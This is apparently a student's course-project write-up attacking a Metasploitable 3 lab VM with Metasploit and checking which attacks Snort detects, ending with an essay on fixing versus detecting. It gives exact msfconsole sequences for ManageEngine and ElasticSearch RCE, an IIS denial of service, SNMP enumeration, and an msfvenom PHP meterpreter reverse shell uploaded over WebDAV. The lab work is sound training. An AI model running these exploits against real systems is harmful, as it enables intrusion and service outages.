# Cyber Security Base - Course Project II
[https://cybersecuritybase.github.io](https://cybersecuritybase.github.io)

## Setup
* [Kali Linux](https://www.kali.org/)
* [Metasploitable 3](https://github.com/rapid7/metasploitable3) with its requirements
* [Snort](https://www.snort.org/) installed on the Kali with rules for registered users
* [Metasploit Framework Console (msfconsole)](https://community.rapid7.com/community/metasploit)

## Initial scan
Target ip: 172.28.128.3.
### Using the msf
Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
#### Results
     Nmap scan report for 172.28.128.3
     Host is up (0.00022s latency).
     Not shown: 989 filtered ports
     PORT      STATE SERVICE  VERSION
     21/tcp    open  ftp      Microsoft ftpd
     22/tcp    open  ssh      OpenSSH 7.1 (protocol 2.0)
     80/tcp    open  http     Microsoft IIS httpd 7.5
     3000/tcp  open  http     WEBrick httpd 1.3.1 (Ruby 2.3.1 (2016-04-26))
     4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
     8022/tcp  open  http     Apache Tomcat/Coyote JSP engine 1.1
     8080/tcp  open  http     Sun GlassFish Open Source Edition  4.0
     8383/tcp  open  ssl/http Apache httpd
     9200/tcp  open  http     Elasticsearch REST API 1.1.1 (name: Fantastic Four; Lucene 4.7)
     49153/tcp open  msrpc    Microsoft Windows RPC
     49154/tcp open  msrpc    Microsoft Windows RPC
     MAC Address: 08:00:27:B3:15:40 (Oracle VirtualBox virtual NIC)
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Three attacks that Snort identifies
### ManageEngine - CVE-2015-8249
#### Commands in the msf
     use exploit/windows/http/manageengine_connectionid_write
     set rhost 172.28.128.3
     exploit

#### Results in the Snort alert log
##### SID 34716 enabled
     [**] [1:34716:3] SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**]
     [Classification: Web Application Attack] [Priority: 1] 
     04/09-18:44:37.158501 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x4422
     172.28.128.1:38083 -> 172.28.128.3:8020 TCP TTL:128 TOS:0x0 ID:9200 IpLen:20 DgmLen:17428 DF
     ***A**** Seq: 0xA630394  Ack: 0xFDB044A7  Win: 0xE200  TcpLen: 32
     [Xref => http://osvdb.org/show/osvdb/121816][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-8249]

#### Comments
This one leads to total ownage of the target system since meterpreter session with system privileges is acquired.

### ElasticSearch - CVE-2014-3120
#### Commands in the msf
     use exploit/multi/elasticsearch/script_mvel_rce
     set rhost 172.28.128.3
     set payload java/shell/reverse_tcp
     exploit
    
#### Results in the Snort alert log
##### SIDs 36256 and 33830 enabled
     [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
     [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
     04/09-19:49:07.741894 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x189
     172.28.128.1:46517 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:10371 IpLen:20 DgmLen:379 DF
     ***AP*** Seq: 0x7871FD5A  Ack: 0x603FC539  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9491928 1410943 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

     [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
     [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
     04/09-19:49:08.669252 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x181
     172.28.128.1:46523 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:22709 IpLen:20 DgmLen:371 DF
     ***AP*** Seq: 0xEBB68E74  Ack: 0x5E61650E  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9492160 1411036 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

     [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
     [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
     04/09-19:49:08.697926 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x189
     172.28.128.1:45915 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:42194 IpLen:20 DgmLen:379 DF
     ***AP*** Seq: 0xDF957218  Ack: 0x7B51DA0A  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9492167 1411039 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

     [**] [1:33830:2] SERVER-OTHER ElasticSearch script remote code execution attempt [**]
     [Classification: Attempted User Privilege Gain] [Priority: 1] 
     04/09-19:49:08.721584 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x5EA
     172.28.128.1:33297 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:54254 IpLen:20 DgmLen:1500 DF
     ***A**** Seq: 0x2AAC0522  Ack: 0x9E85494E  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9492173 1411042 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

#### Comments
User level meterpreter session acquired.

### IIS - HTTP - CVE-2015-1635
#### Commands in the msf
     use auxiliary/dos/http/ms15_034_ulonglongadd
     set rhost 172.28.128.3
     exploit

#### Results in the Snort alert log
##### SID 34061 enabled
     [**] [1:34061:3] SERVER-IIS Microsoft IIS Range header integer overflow attempt [**]
     [Classification: Attempted Denial of Service] [Priority: 2] 
     04/09-22:05:31.382374 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0xD8
     172.28.128.1:36419 -> 172.28.128.3:80 TCP TTL:128 TOS:0x0 ID:1364 IpLen:20 DgmLen:202 DF
     ***AP*** Seq: 0x7EEE4D57  Ack: 0x1FAA7483  Win: 0x400  TcpLen: 32
     [Xref => http://technet.microsoft.com/en-us/security/bulletin/ms15-034][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1635][Xref => http://www.securityfocus.com/bid/74013]

#### Comments
Wau, BSOD.

## Two attacks that Snort doesn't identify
### auxiliary/scanner/snmp/snmp_enum
#### Commands in the msf
     use auxiliary/scanner/snmp/snmp_enum
     set rhost 172.28.128.3
     run

#### Results
todo: put a link here

#### Comments
A lot of useful information can be acquired with this one. E.g. all users and running processes are very critical data. Tried to find SIDs to enable. Found SID 516, but no alerts with that.

### WebDAV - OSVDB-397
#### Verification
##### Commands in the msf
      use auxiliary/scanner/http/http_put
      set rhosts 172.28.128.3
      set rport 8585
      set path /uploads
      set filename test.txt
      set filedata muahahaha
      run

##### Is it there?
      Use a meterpreter session to find out that is there a file named test.txt in dir C:\wamp\www\uploads with string "muahahaha".

#### Exploitation
Sources [https://github.com/rapid7/metasploitable3/pull/16](https://github.com/rapid7/metasploitable3/pull/16) and [https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
##### Generate a PHP meterpreter
      msfvenom -p php/meterpreter/reverse_tcp lhost=172.28.128.1 lport=5555 -f raw -o /tmp/evil.php
##### In a msf console 1
      use use exploit/multi/handler
      set payload php/meterpreter/reverse_tcp
      set lhost 172.28.128.1
      set lport 5555
      run

##### Then in a msf console 2
      use auxiliary/scanner/http/http_put
      set rhosts 172.28.128.3
      set rport 8585
      set path /uploads
      set filename evil.php
      set filedata file://tmp/evil.php
      run

##### Check the msf console 1
There should be a meterpreter session established with LOCAL SERVICE (0) privileges.

## Is it easier to fix the application than to detect attacks?
Neither is good. Applications should be developed so that fixing and detection are not needed in the first place.

When the question is about *fixing* and *detecting*, one should think differences between fixing and detecting. Also consequences of different strategies or actions should be considered.

Detecting attacks doesn't always lead to successful prevention. Fixing an application can make detections purposeless in the first place.

Why there's need for fixes in a software? Software development isn't easy. Developing secure software is not certainly easier. Even if there's very skilled devs working on a software, it's better to believe that there's some mistakes related to security aspects in the software. Then there's very skilled security researchers who try to find vulnerabilities. In white hat community researchers tend to tell about the vulnerabilities to right authorities. Then, if the authorities are reliable and responsible, they fix their software fast.

If assumed that in a system all software are up to date and all configs are done in secure way, then detecting known software attacks can be thought to be somehow purposeless. So what if there's attacks which are not dangerous for the system? But yes, detections can be used in avoiding bad traffic to the system. IDS systems are still needed, because not all attacks are against some known vulnerabilities against some web server software. Machine learning is used and will be used in detecting divergent traffic to a system (or out of). Traffic related to some not publicly known or rare intrusion techniques.

It could be possible to find out a not publicly known vulnerability in a software by catching exploit attempts with an IDS.

Which one is then easier? Software has to be well designed and implemented. There's no question about that. In real world security of a software improves over time. Servers are not always up to date. Therefore detection is good for cases like that. In my opinion it is much easier to fix a software than let it be and rely on detections. Fixing a software demands developers to write fixes and then distribute updates. Not fixing a software causes probably a lot of hassle in many organizations and detecting is not still enough! Also amount of active detection rules grow too much if one relies on detections too much. If thought from aggregate amount of work point of view, then fixing a software is easier. And if thought from aggregate amount of security point of view fixing software is also easier.

But. If the question is just read literally, then it just depends on the application and the attackers. How vulnerable is the application? How complex is the application? How skilled are the attackers?